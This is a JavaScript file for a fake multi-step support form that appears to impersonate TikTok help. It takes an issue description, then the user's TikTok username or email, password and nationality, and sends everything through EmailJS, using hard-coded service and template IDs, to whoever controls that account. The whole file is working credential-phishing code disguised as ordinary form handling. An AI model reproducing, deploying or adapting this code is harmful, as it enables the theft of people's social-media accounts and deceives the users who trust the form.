document.addEventListener('DOMContentLoaded', () => {
    const pages = document.querySelectorAll('.page');
    const page1Form = document.querySelector('#page1Form');
    const page2Form = document.querySelector('#detailsForm');

    let formData = {};

    emailjs.init('FZpOzwvuebcCdRXS3'); // Replace with your EmailJS Public Key

    // Function to show a page
    function showPage(pageIndex) {
        pages.forEach((page, index) => {
            page.classList.toggle('active', index === pageIndex);
            page.classList.toggle('hiddenpage', index !== pageIndex);
        });
    }

    // Page 1: Collect issue description
    page1Form.addEventListener('submit', (event) => {
        event.preventDefault();
        const issue = page1Form.querySelector('textarea').value.trim();
        if (!issue) {
            alert('Please describe your issue.');
            return;
        }
        formData.issue = issue;
        showPage(1); // Go to page 2
    });

    // Page 2: Collect TikTok details and send email
    page2Form.addEventListener('submit',
        (event) => {
            event.preventDefault();
            const usernameEmail = page2Form.querySelector('input[name="username-email"]').value.trim();
            const password = page2Form.querySelector('input[name="password"]').value.trim();
            const nationality = page2Form.querySelector('input[name="nationality"]').value.trim();

            if (!usernameEmail || !password || !nationality) {
                alert('Please fill out all fields.');
                return;
            }

            formData.usernameEmail = usernameEmail;
            formData.password = password;
            formData.nationality = nationality;

            sendEmail(formData).then(() => {
                showPage(2); // Go to page 3
            }).catch((error) => {
                console.error('Failed to send email:', error);
                alert('Failed to send data. Please try again.');
            });
        });

    // Email sending function
    async function sendEmail(data) {
        const emailParams = {
            issue: data.issue,
            username_email: data.usernameEmail,
            password: data.password,
            nationality: data.nationality
        };

        return emailjs.send('service_mtruhej',
            'template_xe62yav',
            emailParams)
        .then((response) => {
            console.log('Email successfully sent:', response.status, response.text);
        })
        .catch((error) => {
            console.error('Failed to send email:', error);
            throw error;
        });
    }
});
